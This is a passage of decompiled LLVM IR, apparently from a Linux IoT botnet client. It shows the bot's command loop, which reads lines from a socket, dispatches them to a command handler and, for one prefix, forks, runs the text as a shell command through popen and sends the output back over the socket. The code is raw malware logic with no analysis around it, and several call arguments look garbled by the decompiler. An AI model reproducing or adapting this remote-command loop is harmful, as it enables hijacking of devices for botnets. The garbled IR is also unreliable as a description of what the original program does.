  br i1 %v7_805048b, label %dec_label_pc_8050498, label %dec_label_pc_805048f

dec_label_pc_805048f:                             ; preds = %dec_label_pc_805047b, %dec_label_pc_8050483
  %v5_8050489215 = phi i32 [ %v5_8050489, %dec_label_pc_8050483 ], [ %v1_8050439, %dec_label_pc_805047b ]
  %v4_8050486214 = phi i32 [ %v5_8050483, %dec_label_pc_8050483 ], [ %v1_80503fe, %dec_label_pc_805047b ]
  %stack_var_-64.1213 = phi i8* [ %v22_8050483, %dec_label_pc_8050483 ], [ %v5_8050401, %dec_label_pc_805047b ]
  store i32 %v4_8050486214, i32* %eax.global-to-local, align 4
  %v2_8050492 = load i8, i8* %stack_var_-64.1213, align 1
  %v3_8050492 = zext i8 %v2_8050492 to i32
  %v6_8050492 = or i32 %v3_8050492, %v5_8050489215
  store i32 %v6_8050492, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050494 = icmp eq i8 %v2_8050492, 0
  %v1_8050496 = icmp eq i1 %v4_8050494, false
  br i1 %v1_8050496, label %dec_label_pc_8050483, label %dec_label_pc_8050498

dec_label_pc_8050498:                             ; preds = %dec_label_pc_8050483, %dec_label_pc_805048f, %dec_label_pc_805047b
  %stack_var_-64.1.lcssa = phi i8* [ %v5_8050401, %dec_label_pc_805047b ], [ %stack_var_-64.1213, %dec_label_pc_805048f ], [ %v22_8050483, %dec_label_pc_8050483 ]
  %v4_8050486.lcssa = phi i32 [ %v1_80503fe, %dec_label_pc_805047b ], [ %v4_8050486214, %dec_label_pc_805048f ], [ %v5_8050483, %dec_label_pc_8050483 ]
  store i8 0, i8* %stack_var_-64.1.lcssa, align 1
  %v5_805049e = add i32 %v4_8050486.lcssa, 1
  store i32 %v1_80503fe, i32* %eax.global-to-local, align 4
  %v2_80504cc221 = load i8, i8* %v5_8050401, align 1
  %v3_80504cc222 = zext i8 %v2_80504cc221 to i32
  %v6_80504cc224 = or i32 %v3_80504cc222, %v1_8050439
  store i32 %v6_80504cc224, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80504ce225 = icmp eq i8 %v2_80504cc221, 0
  %v1_80504d0226 = icmp eq i1 %v4_80504ce225, false
  br i1 %v1_80504d0226, label %dec_label_pc_80504a9, label %dec_label_pc_80504d2

dec_label_pc_80504a9:                             ; preds = %dec_label_pc_8050498, %dec_label_pc_80504a9
  %storemerge15228 = phi i8* [ %storemerge15, %dec_label_pc_80504a9 ], [ %v5_8050401, %dec_label_pc_8050498 ]
  %storemerge15.in227 = phi i32 [ %v5_80504c6, %dec_label_pc_80504a9 ], [ %v1_80503fe, %dec_label_pc_8050498 ]
  store i32 %storemerge15.in227, i32* %eax.global-to-local, align 4
  %v2_80504ac = load i8, i8* %storemerge15228, align 1
  %v3_80504ac = zext i8 %v2_80504ac to i32
  store i32 %v3_80504ac, i32* %eax.global-to-local, align 4
  %v0_80504b3 = load i32, i32* @esp, align 4
  %v5_80504b3 = icmp ult i32 %v0_80504b3, 12
  store i1 %v5_80504b3, i1* %cf.global-to-local, align 1
  %v2_80504b6 = add i32 %v0_80504b3, -16
  %v3_80504b6 = inttoptr i32 %v2_80504b6 to i32*
  store i32 %v3_80504ac, i32* %v3_80504b6, align 4
  %v2_80504b7 = call i32 @__GI_toupper(i32 %storemerge15.in227)
  %v0_80504bc = load i32, i32* @esp, align 4
  %v2_80504bc = icmp ugt i32 %v0_80504bc, -17
  store i1 %v2_80504bc, i1* %cf.global-to-local, align 1
  %v1_80504bf = urem i32 %v2_80504b7, 256
  %v2_80504bf = load i32, i32* @edx, align 4
  %v3_80504bf = and i32 %v2_80504bf, -256
  %v4_80504bf = or i32 %v3_80504bf, %v1_80504bf
  store i32 %v4_80504bf, i32* @edx, align 4
  %v1_80504c4 = trunc i32 %v2_80504b7 to i8
  store i8 %v1_80504c4, i8* %storemerge15228, align 1
  %v5_80504c6 = add i32 %storemerge15.in227, 1
  %storemerge15 = inttoptr i32 %v5_80504c6 to i8*
  store i32 %v5_80504c6, i32* %eax.global-to-local, align 4
  %v2_80504cc = load i8, i8* %storemerge15, align 1
  %v3_80504cc = zext i8 %v2_80504cc to i32
  %v5_80504cc = and i32 %v5_80504c6, -256
  %v6_80504cc = or i32 %v3_80504cc, %v5_80504cc
  store i32 %v6_80504cc, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80504ce = icmp eq i8 %v2_80504cc, 0
  %v1_80504d0 = icmp eq i1 %v4_80504ce, false
  br i1 %v1_80504d0, label %dec_label_pc_80504a9, label %dec_label_pc_80504d2

dec_label_pc_80504d2:                             ; preds = %dec_label_pc_80504a9, %dec_label_pc_8050498
  %v22_805049e = inttoptr i32 %v5_805049e to i8*
  store i32 %v1_80503fe, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_80503fe, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80591f7.461 to i32), i32* @edi, align 4
  %v7_8050502 = call i32 @_strncmp(i8* %v5_8050401, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80591f7.461, i32 0, i32 0), i32 3)
  %v8_8050502 = urem i32 %v7_8050502, 2
  %v9_8050502 = icmp eq i32 %v8_8050502, 0
  %v0_8050504 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050504 = or i1 %v0_8050504, %v9_8050502
  %v3_8050504 = zext i1 %v2_8050504 to i32
  %v4_8050504 = load i32, i32* @edx, align 4
  %v5_8050504 = and i32 %v4_8050504, -256
  %v6_8050504 = or i32 %v3_8050504, %v5_8050504
  %v7_8050504 = xor i32 %v6_8050504, 1
  store i32 %v7_8050504, i32* @edx, align 4
  %v3_805050a = and i32 %v7_8050502, -256
  %v1_805050c = trunc i32 %v7_8050504 to i8
  %v3_805050c = zext i1 %v0_8050504 to i8
  %v4_805050c = sub nsw i8 %v1_805050c, %v3_805050c
  %v15_805050c = icmp eq i8 %v4_805050c, 0
  %v20_805050c = zext i8 %v4_805050c to i32
  %v23_805050c = or i32 %v20_805050c, %v3_805050a
  store i32 %v23_805050c, i32* @ecx, align 4
  %v2_8050510 = sext i8 %v4_805050c to i32
  store i32 %v2_8050510, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050515 = icmp eq i1 %v15_805050c, false
  br i1 %v1_8050515, label %dec_label_pc_805060b, label %dec_label_pc_805051b

dec_label_pc_805051b:                             ; preds = %dec_label_pc_80504d2
  %v0_805051b = call i32 @listFork()
  store i32 %v0_805051b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050520 = icmp eq i32 %v0_805051b, 0
  %v1_8050522 = icmp eq i1 %v1_8050520, false
  br i1 %v1_8050522, label %dec_label_pc_8050735.outer26.backedge, label %dec_label_pc_8050528

dec_label_pc_8050528:                             ; preds = %dec_label_pc_805051b
  store i32 %v2_8050528, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_8050535 = load i32, i32* @esp, align 4
  %v5_8050535 = icmp ult i32 %v0_8050535, 4
  store i1 %v5_8050535, i1* %cf.global-to-local, align 1
  %v2_8050538 = add i32 %v0_8050535, -8
  %v3_8050538 = inttoptr i32 %v2_8050538 to i32*
  store i32 1024, i32* %v3_8050538, align 4
  %v1_8050539 = add i32 %v0_8050535, -12
  %v2_8050539 = inttoptr i32 %v1_8050539 to i32*
  store i32 0, i32* %v2_8050539, align 4
  %v2_805053b = add i32 %v0_8050535, -16
  %v3_805053b = inttoptr i32 %v2_805053b to i32*
  store i32 %v2_8050528, i32* %v3_805053b, align 4
  %v5_805053c = call i32 @__GI_memset(i8* inttoptr (i32 3 to i8*), i32 ptrtoint ([3 x i8]* @global_var_80591f7.461 to i32), i32 %v1_80503fe)
  %v0_8050541 = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_80591fa.462 to i32), i32* %eax.global-to-local, align 4
  %tmp256 = and i32 %v0_8050541, -4
  %v5_8050549 = icmp eq i32 %tmp256, -16
  store i1 %v5_8050549, i1* %cf.global-to-local, align 1
  %v6_805054c = add i32 %v0_8050541, 8
  %v7_805054c = inttoptr i32 %v6_805054c to i32*
  store i32 %v5_805049e, i32* %v7_805054c, align 4
  %v0_805054f = load i32, i32* %eax.global-to-local, align 4
  %v2_805054f = add i32 %v0_8050541, 4
  %v3_805054f = inttoptr i32 %v2_805054f to i32*
  store i32 %v0_805054f, i32* %v3_805054f, align 4
  store i32 %v2_8050528, i32* %eax.global-to-local, align 4
  %v3_8050556 = inttoptr i32 %v0_8050541 to i32*
  store i32 %v2_8050528, i32* %v3_8050556, align 4
  %v5_8050557 = call i32 @szprintf(i32 3, i32 ptrtoint ([3 x i8]* @global_var_80591f7.461 to i32), i32 %v1_80503fe, i32 %v1_80503fe)
  %v0_805055c = load i32, i32* @esp, align 4
  %tmp257 = and i32 %v0_805055c, -8
  %v5_8050564 = icmp eq i32 %tmp257, -16
  store i1 %v5_8050564, i1* %cf.global-to-local, align 1
  %v2_8050567 = add i32 %v0_805055c, 4
  %v3_8050567 = inttoptr i32 %v2_8050567 to i32*
  store i32 ptrtoint (i32* @global_var_80591a6.451 to i32), i32* %v3_8050567, align 4
  store i32 %v2_8050528, i32* @eax, align 4
  %v3_805056e = inttoptr i32 %v0_805055c to i32*
  store i32 %v2_8050528, i32* %v3_805056e, align 4
  %v0_805056f = call i32 @fdpopen()
  store i32 %v0_805056f, i32* %eax.global-to-local, align 4
  %v3_80505c0 = inttoptr i32 %v0_805056f to i8*
  br label %dec_label_pc_80505d5

dec_label_pc_805057c:                             ; preds = %dec_label_pc_80505d5
  store i32 %v2_8050528, i32* %eax.global-to-local, align 4
  %v5_8050582 = icmp ult i32 %v1_80505ec, 12
  store i1 %v5_8050582, i1* %cf.global-to-local, align 1
  %v3_8050585 = inttoptr i32 %v0_80505ec to i32*
  store i32 %v2_8050528, i32* %v3_8050585, align 4
  %v0_8050586 = call i32 @trim()
  %v0_805058b = load i32, i32* @esp, align 4
  %v0_805058e = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_805058e, i32* %edx.global-to-local, align 4
  %tmp258 = and i32 %v0_805058b, -4
  %v5_8050594 = icmp eq i32 %tmp258, -16
  store i1 %v5_8050594, i1* %cf.global-to-local, align 1
  store i32 %v2_8050528, i32* %eax.global-to-local, align 4
  %v2_805059d = add i32 %v0_805058b, 8
  %v3_805059d = inttoptr i32 %v2_805059d to i32*
  store i32 %v2_8050528, i32* %v3_805059d, align 4
  %v1_805059e = add i32 %v0_805058b, 4
  %v2_805059e = inttoptr i32 %v1_805059e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8059202.463 to i32), i32* %v2_805059e, align 4
  %v0_80505a3 = load i32, i32* %edx.global-to-local, align 4
  %v3_80505a3 = inttoptr i32 %v0_805058b to i32*
  store i32 %v0_80505a3, i32* %v3_80505a3, align 4
  %v2_80505a4 = call i32 @sockprintf(i32 %v0_805056f, i32 %stack_var_-28.1.ph)
  %v0_80505a9 = load i32, i32* @esp, align 4
  store i32 %v2_8050528, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %tmp259 = and i32 %v0_80505a9, -4
  %v5_80505b9 = icmp eq i32 %tmp259, -16
  store i1 %v5_80505b9, i1* %cf.global-to-local, align 1
  %v2_80505bc = add i32 %v0_80505a9, 8
  %v3_80505bc = inttoptr i32 %v2_80505bc to i32*
  store i32 1024, i32* %v3_80505bc, align 4
  %v1_80505bd = add i32 %v0_80505a9, 4
  %v2_80505bd = inttoptr i32 %v1_80505bd to i32*
  store i32 0, i32* %v2_80505bd, align 4
  %v3_80505bf = inttoptr i32 %v0_80505a9 to i32*
  store i32 %v2_8050528, i32* %v3_80505bf, align 4
  %v2_80505c0 = load i32, i32* %stack_var_-24, align 4
  %v4_80505c0 = call i32 @__GI_memset(i8* %v3_80505c0, i32 %stack_var_-28.1.ph, i32 %v2_80505c0)
  store i32 %v4_80505c0, i32* %eax.global-to-local, align 4
  %v0_80505c5 = load i32, i32* @esp, align 4
  %v1_80505c5 = add i32 %v0_80505c5, 16
  %v5_80505c8 = icmp ult i32 %v1_80505c5, 12
  store i1 %v5_80505c8, i1* %cf.global-to-local, align 1
  %v2_80505cb = inttoptr i32 %v0_80505c5 to i32*
  store i32 1, i32* %v2_80505cb, align 4
  %v1_80505cd = call i32 @sleep(i32 %v0_805056f)
  store i32 %v1_80505cd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80505d5

dec_label_pc_80505d5:                             ; preds = %dec_label_pc_8050528, %dec_label_pc_805057c
  %storemerge23.in.in = load i32, i32* @esp, align 4
  %tmp260 = and i32 %storemerge23.in.in, -4
  %v5_80505d5 = icmp eq i32 %tmp260, -16
  store i1 %v5_80505d5, i1* %cf.global-to-local, align 1
  %v5_80505d8 = add i32 %storemerge23.in.in, 8
  %v6_80505d8 = inttoptr i32 %v5_80505d8 to i32*
  store i32 %v0_805056f, i32* %v6_80505d8, align 4
  %v1_80505db = add i32 %storemerge23.in.in, 4
  %v2_80505db = inttoptr i32 %v1_80505db to i32*
  store i32 1024, i32* %v2_80505db, align 4
  store i32 %v2_8050528, i32* %eax.global-to-local, align 4
  %v3_80505e6 = inttoptr i32 %storemerge23.in.in to i32*
  store i32 %v2_8050528, i32* %v3_80505e6, align 4
  %v2_80505e7 = load i32, i32* %stack_var_-24, align 4
  %v3_80505e7 = call i32 @fdgets(i32 %v0_805056f, i32 %stack_var_-28.1.ph, i32 %v2_80505e7)
  store i32 %v3_80505e7, i32* %eax.global-to-local, align 4
  %v0_80505ec = load i32, i32* @esp, align 4
  %v1_80505ec = add i32 %v0_80505ec, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80505ef = icmp eq i32 %v3_80505e7, 0
  %v1_80505f1 = icmp eq i1 %v1_80505ef, false
  br i1 %v1_80505f1, label %dec_label_pc_805057c, label %dec_label_pc_80505f3

dec_label_pc_80505f3:                             ; preds = %dec_label_pc_80505d5
  %v5_80505f3 = icmp ult i32 %v1_80505ec, 12
  store i1 %v5_80505f3, i1* %cf.global-to-local, align 1
  %v6_80505f6 = inttoptr i32 %v0_80505ec to i32*
  store i32 %v0_805056f, i32* %v6_80505f6, align 4
  %v0_80505f9 = call i32 @fdpclose()
  store i32 %v0_80505f9, i32* @eax, align 4
  %v0_80505fe = load i32, i32* @esp, align 4
  %v1_80505fe = add i32 %v0_80505fe, 16
  %v5_8050601 = icmp ult i32 %v1_80505fe, 12
  store i1 %v5_8050601, i1* %cf.global-to-local, align 1
  %v2_8050604 = inttoptr i32 %v0_80505fe to i32*
  store i32 0, i32* %v2_8050604, align 4
  %v1_8050606 = call i32 @__GI_exit(i32 %v0_805056f)
  store i32 %v1_8050606, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805060b

dec_label_pc_805060b:                             ; preds = %dec_label_pc_80504d2, %dec_label_pc_80505f3
  store i32 %v5_805049e, i32* @eax, align 4
  %v0_8050615 = load i32, i32* @esp, align 4
  %v5_8050615 = icmp ult i32 %v0_8050615, 8
  store i1 %v5_8050615, i1* %cf.global-to-local, align 1
  %v1_8050618 = add i32 %v0_8050615, -12
  %v2_8050618 = inttoptr i32 %v1_8050618 to i32*
  store i32 ptrtoint (i32* @global_var_8059205.464 to i32), i32* %v2_8050618, align 4
  %v0_805061d = load i32, i32* @eax, align 4
  %v2_805061d = add i32 %v0_8050615, -16
  %v3_805061d = inttoptr i32 %v2_805061d to i32*
  store i32 %v0_805061d, i32* %v3_805061d, align 4
  %v1_805061e = load i8*, i8** %stack_var_-36, align 4
  %v2_805061e = ptrtoint i8* %v1_805061e to i32
  %v3_805061e = call i32 @__GI_strtok(i32 1, i32 %v2_805061e)
  %v0_8050623 = load i32, i32* @esp, align 4
  %v1_8050623 = add i32 %v0_8050623, 16
  %v5_8050626 = inttoptr i32 %v3_805061e to i8*
  store i8* %v5_8050626, i8** %stack_var_-36, align 4
  store i32 %v1_80503fe, i32* %eax.global-to-local, align 4
  store i32 %v1_80503fe, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_80506df47 = icmp eq i32 %v3_805061e, 0
  %v1_80506e354 = icmp eq i1 %v5_80506df47, false
  br i1 %v1_80506e354, label %dec_label_pc_8050637, label %dec_label_pc_80506e9

dec_label_pc_8050637:                             ; preds = %dec_label_pc_805060b, %dec_label_pc_80506ca
  %v0_80506ca74 = phi i32 [ %v1_80506d9, %dec_label_pc_80506ca ], [ %v1_8050623, %dec_label_pc_805060b ]
  %v3_8050647 = phi i8* [ %tmp171, %dec_label_pc_80506ca ], [ %v5_8050626, %dec_label_pc_805060b ]
  %stack_var_-40.155 = phi i32 [ %stack_var_-40.0, %dec_label_pc_80506ca ], [ 1, %dec_label_pc_805060b ]
  %v4_8050637 = ptrtoint i8* %v3_8050647 to i32
  store i32 %v4_8050637, i32* %eax.global-to-local, align 4
  %v2_805063a = load i8, i8* %v3_8050647, align 1
  %v3_805063a = zext i8 %v2_805063a to i32
  %v5_805063a = and i32 %v4_8050637, -256
  %v6_805063a = or i32 %v3_805063a, %v5_805063a
  store i32 %v6_805063a, i32* @eax, align 4
  %v6_805063c = icmp ult i8 %v2_805063a, 10
  store i1 %v6_805063c, i1* %cf.global-to-local, align 1
  %v10_805063c = icmp eq i8 %v2_805063a, 10
  br i1 %v10_805063c, label %dec_label_pc_80506ca, label %dec_label_pc_8050644

dec_label_pc_8050644:                             ; preds = %dec_label_pc_8050637
  store i32 %stack_var_-40.155, i32* @ebx, align 4
  store i32 %v5_805063a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050637, i32* @edi, align 4
  %v3_805065e = call i32 @_strlen(i8* %v3_8050647)
  %v1_8050662 = add i32 %v3_805065e, 1
  store i32 %v1_8050662, i32* %eax.global-to-local, align 4
  %v0_8050666 = load i32, i32* @esp, align 4
  %v5_8050666 = icmp ult i32 %v0_8050666, 12
  store i1 %v5_8050666, i1* %cf.global-to-local, align 1
  %v2_8050669 = add i32 %v0_8050666, -16
  %v3_8050669 = inttoptr i32 %v2_8050669 to i32*
  store i32 %v1_8050662, i32* %v3_8050669, align 4
  %v2_805066a = call i32 @malloc(i32 %v4_8050637)
  %v0_805066f = load i32, i32* @esp, align 4
  %v2_805066f = icmp ugt i32 %v0_805066f, -17
  store i1 %v2_805066f, i1* %cf.global-to-local, align 1
  %v1_8050672 = load i32, i32* @ebp, align 4
  %v2_8050672 = load i32, i32* @ebx, align 4
  %v3_8050672 = mul i32 %v2_8050672, 4
  %v4_8050672 = add i32 %v1_8050672, -616
  %v5_8050672 = add i32 %v4_8050672, %v3_8050672
  %v6_8050672 = inttoptr i32 %v5_8050672 to i32*
  store i32 %v2_805066a, i32* %v6_8050672, align 4
  %v3_8050679 = load i8*, i8** %stack_var_-36, align 4
  %v4_8050679 = ptrtoint i8* %v3_8050679 to i32
  %v1_8050687 = and i32 %v4_8050679, -256
  store i32 %v1_8050687, i32* %eax.global-to-local, align 4
  %v3_8050690 = call i32 @_strlen(i8* %v3_8050679)
  %v1_8050694 = add i32 %v3_8050690, 1
  store i32 %v1_8050694, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.155, i32* %eax.global-to-local, align 4
  %v0_805069d = load i32, i32* @ebp, align 4
  %v2_805069d = mul i32 %stack_var_-40.155, 4
  %v3_805069d = add i32 %v2_805069d, -616
  %v4_805069d = add i32 %v0_805069d, %v3_805069d
  %v5_805069d = inttoptr i32 %v4_805069d to i32*
  %v6_805069d = load i32, i32* %v5_805069d, align 4
  %v1_80506a4 = inttoptr i32 %v6_805069d to i8*
  store i32 %v6_805069d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_80506a9 = and i32 %v6_805069d, -256
  store i32 %v1_80506a9, i32* %eax.global-to-local, align 4
  %v5_80506ab = call i8* @_memset(i8* %v1_80506a4, i32 %v1_80506a9, i32 %v1_8050694)
  %v6_80506ab = ptrtoint i8* %v5_80506ab to i32
  store i32 %v6_80506ab, i32* @ecx, align 4
  store i32 %v4_8050679, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.155, i32* %eax.global-to-local, align 4
  %v0_80506b3 = load i32, i32* @ebp, align 4
  %v4_80506b3 = add i32 %v0_80506b3, %v3_805069d
  %v5_80506b3 = inttoptr i32 %v4_80506b3 to i32*
  %v6_80506b3 = load i32, i32* %v5_80506b3, align 4
  store i32 %v6_80506b3, i32* @eax, align 4
  %v0_80506ba = load i32, i32* @esp, align 4
  %v5_80506ba = icmp ult i32 %v0_80506ba, 8
  store i1 %v5_80506ba, i1* %cf.global-to-local, align 1
  %v2_80506bd = add i32 %v0_80506ba, -12
  %v3_80506bd = inttoptr i32 %v2_80506bd to i32*
  store i32 %v4_8050679, i32* %v3_80506bd, align 4
  %v0_80506be = load i32, i32* @eax, align 4
  %v2_80506be = add i32 %v0_80506ba, -16
  %v3_80506be = inttoptr i32 %v2_80506be to i32*
  store i32 %v0_80506be, i32* %v3_80506be, align 4
  %v5_80506bf = call i32 @strcpy(i8* %v3_8050679, i32 %v4_8050637)
  store i32 %v5_80506bf, i32* @eax, align 4
  %v0_80506c4 = load i32, i32* @esp, align 4
  %v1_80506c4 = add i32 %v0_80506c4, 16
  %v2_80506c4 = icmp ugt i32 %v0_80506c4, -17
  store i1 %v2_80506c4, i1* %cf.global-to-local, align 1
  %v4_80506c7 = add i32 %stack_var_-40.155, 1
  br label %dec_label_pc_80506ca

dec_label_pc_80506ca:                             ; preds = %dec_label_pc_8050637, %dec_label_pc_8050644
  %v0_80506ca = phi i32 [ %v0_80506ca74, %dec_label_pc_8050637 ], [ %v1_80506c4, %dec_label_pc_8050644 ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.155, %dec_label_pc_8050637 ], [ %v4_80506c7, %dec_label_pc_8050644 ]
  %v5_80506ca = icmp ult i32 %v0_80506ca, 8
  store i1 %v5_80506ca, i1* %cf.global-to-local, align 1
  %v1_80506cd = add i32 %v0_80506ca, -12
  %v2_80506cd = inttoptr i32 %v1_80506cd to i32*
  store i32 ptrtoint (i32* @global_var_8059205.464 to i32), i32* %v2_80506cd, align 4
  %v1_80506d2 = add i32 %v0_80506ca, -16
  %v2_80506d2 = inttoptr i32 %v1_80506d2 to i32*
  store i32 0, i32* %v2_80506d2, align 4
  %v1_80506d4 = load i8*, i8** %stack_var_-36, align 4
  %v2_80506d4 = ptrtoint i8* %v1_80506d4 to i32
  %v3_80506d4 = call i32 @__GI_strtok(i32 %stack_var_-40.0, i32 %v2_80506d4)
  store i32 %v3_80506d4, i32* %eax.global-to-local, align 4
  %v0_80506d9 = load i32, i32* @esp, align 4
  %v1_80506d9 = add i32 %v0_80506d9, 16
  store i32 %v3_80506d4, i32* %tmp169, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_80506df = icmp eq i32 %v3_80506d4, 0
  %v1_80506e3 = icmp eq i1 %v5_80506df, false
  %tmp171 = inttoptr i32 %v3_80506d4 to i8*
  br i1 %v1_80506e3, label %dec_label_pc_8050637, label %dec_label_pc_80506e9

dec_label_pc_80506e9:                             ; preds = %dec_label_pc_80506ca, %dec_label_pc_805060b
  %v0_80506e9 = phi i32 [ %v1_8050623, %dec_label_pc_805060b ], [ %v1_80506d9, %dec_label_pc_80506ca ]
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_805060b ], [ %stack_var_-40.0, %dec_label_pc_80506ca ]
  %v5_80506e9 = icmp ult i32 %v0_80506e9, 8
  store i1 %v5_80506e9, i1* %cf.global-to-local, align 1
  store i32 %v2_80506ec, i32* %eax.global-to-local, align 4
  %v2_80506f2 = add i32 %v0_80506e9, -12
  %v3_80506f2 = inttoptr i32 %v2_80506f2 to i32*
  store i32 %v2_80506ec, i32* %v3_80506f2, align 4
  %v5_80506f3 = add i32 %v0_80506e9, -16
  %v6_80506f3 = inttoptr i32 %v5_80506f3 to i32*
  store i32 %stack_var_-40.1.lcssa, i32* %v6_80506f3, align 4
  %v0_80506f6 = call i32 @processCmd()
  store i32 %v0_80506f6, i32* %eax.global-to-local, align 4
  %v0_80506fb = load i32, i32* @esp, align 4
  %v9_80506fe = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_80506fe, i1* %cf.global-to-local, align 1
  %v7_8050702 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_8050702, label %dec_label_pc_8050714.lr.ph, label %dec_label_pc_8050735.outer26.backedge

dec_label_pc_8050714.lr.ph:                       ; preds = %dec_label_pc_80506e9
  %v1_80506fb = add i32 %v0_80506fb, 16
  store i32 1, i32* %eax.global-to-local, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050714

dec_label_pc_8050714:                             ; preds = %dec_label_pc_8050714.lr.ph, %dec_label_pc_8050714
  %storemerge233 = phi i32 [ 1, %dec_label_pc_8050714.lr.ph ], [ %v4_805072a, %dec_label_pc_8050714 ]
  %v0_805071e232 = phi i32 [ %v1_80506fb, %dec_label_pc_8050714.lr.ph ], [ %v1_8050727, %dec_label_pc_8050714 ]
  store i32 %storemerge233, i32* %eax.global-to-local, align 4
  %v0_8050717 = load i32, i32* @ebp, align 4
  %v2_8050717 = mul i32 %storemerge233, 4
  %v3_8050717 = add i32 %v2_8050717, -616
  %v4_8050717 = add i32 %v3_8050717, %v0_8050717
  %v5_8050717 = inttoptr i32 %v4_8050717 to i32*
  %v6_8050717 = load i32, i32* %v5_8050717, align 4
  store i32 %v6_8050717, i32* %eax.global-to-local, align 4
  %v5_805071e = icmp ult i32 %v0_805071e232, 12
  store i1 %v5_805071e, i1* %cf.global-to-local, align 1
  %v2_8050721 = add i32 %v0_805071e232, -16
  %v3_8050721 = inttoptr i32 %v2_8050721 to i32*
  store i32 %v6_8050717, i32* %v3_8050721, align 4
  %v1_8050722 = call i32 @free(i32 %storemerge233)
  %v0_8050727 = load i32, i32* @esp, align 4
  %v1_8050727 = add i32 %v0_8050727, 16
  %v4_805072a = add nuw nsw i32 %storemerge233, 1
  store i32 %v4_805072a, i32* %eax.global-to-local, align 4
  %v10_8050730 = icmp ult i32 %v4_805072a, %stack_var_-40.1.lcssa
  store i1 %v10_8050730, i1* %cf.global-to-local, align 1
  %v5_8050733 = icmp slt i32 %v4_805072a, %stack_var_-40.1.lcssa
  br i1 %v5_8050733, label %dec_label_pc_8050714, label %dec_label_pc_8050735.outer

dec_label_pc_8050735.outer:                       ; preds = %dec_label_pc_8050714, %dec_label_pc_8050095
  %v0_8050741.pre82 = phi i32 [ %v1_80500c0, %dec_label_pc_8050095 ], [ %v1_8050727, %dec_label_pc_8050714 ]
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_8050095 ], [ %v4_805072a, %dec_label_pc_8050714 ]
  %stack_var_-64.2.ph = phi i8* [ %stack_var_-64.0.ph, %dec_label_pc_8050095 ], [ %v22_805049e, %dec_label_pc_8050714 ]
  %stack_var_-60.3.ph = phi i32 [ %stack_var_-60.0.ph31, %dec_label_pc_8050095 ], [ %stack_var_-60.2, %dec_label_pc_8050714 ]
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph32, %dec_label_pc_8050095 ], [ %stack_var_-96.1, %dec_label_pc_8050714 ]
  br label %dec_label_pc_8050735.outer26

dec_label_pc_8050735.outer26:                     ; preds = %dec_label_pc_8050735.outer26.backedge, %dec_label_pc_8050735.outer
  %v0_8050741.pre = phi i32 [ %v0_8050741.pre82, %dec_label_pc_8050735.outer ], [ %v0_8050741.pre.pre, %dec_label_pc_8050735.outer26.backedge ]
  %stack_var_-64.2.ph27 = phi i8* [ %stack_var_-64.2.ph, %dec_label_pc_8050735.outer ], [ %stack_var_-64.2.ph27.be, %dec_label_pc_8050735.outer26.backedge ]
  %stack_var_-60.3.ph28 = phi i32 [ %stack_var_-60.3.ph, %dec_label_pc_8050735.outer ], [ %stack_var_-60.2, %dec_label_pc_8050735.outer26.backedge ]
  %stack_var_-96.2.ph29 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_8050735.outer ], [ %stack_var_-96.1, %dec_label_pc_8050735.outer26.backedge ]
  %v2_80500fc = ptrtoint i8* %stack_var_-64.2.ph27 to i32
  br label %dec_label_pc_8050735

dec_label_pc_8050735:                             ; preds = %dec_label_pc_8050735.outer26, %dec_label_pc_8050329
  %v0_8050741 = phi i32 [ %v1_805033c, %dec_label_pc_8050329 ], [ %v0_8050741.pre, %dec_label_pc_8050735.outer26 ]
  %stack_var_-60.3 = phi i32 [ %stack_var_-60.2, %dec_label_pc_8050329 ], [ %stack_var_-60.3.ph28, %dec_label_pc_8050735.outer26 ]
  store i32 %v2_8050735, i32* %eax.global-to-local, align 4
  %v0_805073b = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_805073b, i32* %edx.global-to-local, align 4
  %v5_8050741 = icmp ult i32 %v0_8050741, 4
  store i1 %v5_8050741, i1* %cf.global-to-local, align 1
  %v1_8050744 = add i32 %v0_8050741, -8
  %v2_8050744 = inttoptr i32 %v1_8050744 to i32*
  store i32 4096, i32* %v2_8050744, align 4
  %v2_8050749 = add i32 %v0_8050741, -12
  %v3_8050749 = inttoptr i32 %v2_8050749 to i32*
  store i32 %v2_8050735, i32* %v3_8050749, align 4
  %v0_805074a = load i32, i32* %edx.global-to-local, align 4
  %v2_805074a = add i32 %v0_8050741, -16
  %v3_805074a = inttoptr i32 %v2_805074a to i32*
  store i32 %v0_805074a, i32* %v3_805074a, align 4
  %v0_805074b = call i32 @recvLine()
